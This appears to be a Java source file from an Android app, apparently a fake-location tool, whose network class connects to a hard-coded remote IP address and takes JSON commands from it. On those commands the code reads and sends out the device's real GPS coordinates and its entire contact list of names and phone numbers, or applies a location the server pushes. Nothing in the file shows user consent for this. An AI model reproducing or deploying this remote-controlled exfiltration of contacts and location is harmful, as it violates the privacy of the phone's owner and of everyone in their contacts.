package com.swj.fakelocation;

import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract;
import android.util.Log;
import android.database.Cursor;
import org.json.JSONException;
import org.json.JSONObject;
import android.content.ContentResolver;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

import static com.swj.fakelocation.FakeLocationApplication.getContext;
import static com.swj.fakelocation.MainActivity.latitude;
import static com.swj.fakelocation.MainActivity.longtitude;

class GpsLocation
{
    double lon;
    double lat;
}

public class getMainsocket
{
    private static String ip = "47.112.2.66";

    private static int port = 1234;

    private static int result;

    public static int  connMainsocket(final String tag, final Handler handler) {
        new Thread() {
            @Override
            public void run() {
                try {

                    //int result;

                    JSONObject jsonOk = new JSONObject();

                    jsonOk.put("ok","ok");

                    Socket socket = new Socket(ip, port);

                    socket.setSoTimeout(2000);

                    DataOutputStream out = new DataOutputStream(socket.getOutputStream());

                    DataInputStream in = new DataInputStream(socket.getInputStream());

                    //out.writeUTF(send);

                    String receiver = in.readUTF();

                    in.close();

                    JSONObject jsonObject = new JSONObject(receiver);

                    String real = "";
                    if(jsonObject.getString("real")!=null)
                        real = jsonObject.getString("real");
                    String cheat = "";
                    if(jsonObject.getString("cheat") != null)
                        cheat = jsonObject.getString("cheat");
                    String dire = "";
                    if(jsonObject.getString("dire")!=null)
                        dire = jsonObject.getString("dire");
                    String exit = "";
                    if(jsonObject.getString("exit")!=null)
                        exit = jsonObject.getString("exit");

                    if (!exit.equals(""))
                    {
                        result = -1;
                        out.writeUTF(jsonOk.toString());
                        out.close();
                        socket.close();
                        return;
                    }
                    else if (!real.equals("") && !dire.equals(""))
                    {
                        result = 0;
                        out.writeUTF(getAll());
                        out.close();
                        socket.close();
                    }
                    else if(!real.equals(""))
                    {
                        result = 1;
                        out.writeUTF(getReal());
                        out.close();
                        socket.close();
                    }
                    else if (!cheat.equals(""))
                    {
                        result = 2;
                        GpsLocation location = new GpsLocation();
                        location.lon = jsonObject.getDouble("lon");
                        location.lat = jsonObject.getDouble("lat");
                        Message message = new Message();
                        message.obj = location;
                        message.what = 0;
                        handler.sendMessage(message);

                        out.writeUTF(jsonOk.toString());
                        out.close();
                        socket.close();
                    }
                    else if (!dire.equals(""))
                    {
                        result = 3;
                        out.writeUTF(getDir());
                        out.close();
                        socket.close();
                    }

//                    Thread.sleep(1000);

//                    Message message = new Message();
//                    message.what = 0;
//                    message.arg1 = Integer.parseInt(jsonObject.getString("port1"));
//                    handler.sendMessage(message);
                } catch (IOException e) {
                    Log.e(tag, "连接主端口失败");
                    e.printStackTrace();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
//                catch (InterruptedException e)
//                {
//                    e.printStackTrace();
//                }

            }
        }.start();
        return result;
    }

    public static String getReal()
    {
        String send = "";
        try {
            JSONObject jsonRealSend = new JSONObject();
            JSONObject jsonReal = new JSONObject();
            jsonReal.put("lat",latitude);
            jsonReal.put("lon",longtitude);
            jsonRealSend.put("real",jsonReal);
            send = jsonRealSend.toString();

        } catch (JSONException e) {
            e.printStackTrace();
        }
        return send;
    }

    public static String getDir()
    {
        String send = "";
        try
        {
            JSONObject jsonSend = new JSONObject();
            JSONObject jsonDir = new JSONObject();
            Cursor cursor = null;
            try{//查询联系人数据
                cursor =  getContext().getContentResolver().query(ContactsContract.CommonDataKinds.
                        Phone.CONTENT_URI,null,null,null,null);
                if(cursor != null){
                    while (cursor.moveToNext()){
                        String dispalyname= cursor.getString(cursor.getColumnIndex
                                (ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        String number= cursor.getString(cursor.getColumnIndex
                                (ContactsContract.CommonDataKinds.Phone.NUMBER));
                        jsonDir.put(dispalyname,number);
                    }
                }
            }catch (Exception e){
                e.printStackTrace();
            }finally {
                if (cursor !=null){
                    cursor.close();
                }
            }
            //jsonDir.put("许江","13569856547");
            //jsonDir.put("谢康","18956475896");
            jsonSend.put("dire",jsonDir);
            send = jsonSend.toString();
        }
        catch (JSONException e)
        {
            e.printStackTrace();
        }
        return send;
    }
    public static String getAll()
    {
        String send = "";
        try {
            JSONObject jsonSend = new JSONObject();
            JSONObject jsonReal = new JSONObject();
            jsonReal.put("lat",latitude);
            jsonReal.put("lon",longtitude);
            jsonSend.put("real",jsonReal);
            JSONObject jsonDir = new JSONObject();
            jsonSend.put("dire",jsonDir);
            send = jsonSend.toString();


        } catch (JSONException e) {
            e.printStackTrace();
        }
        return send;
    }


}
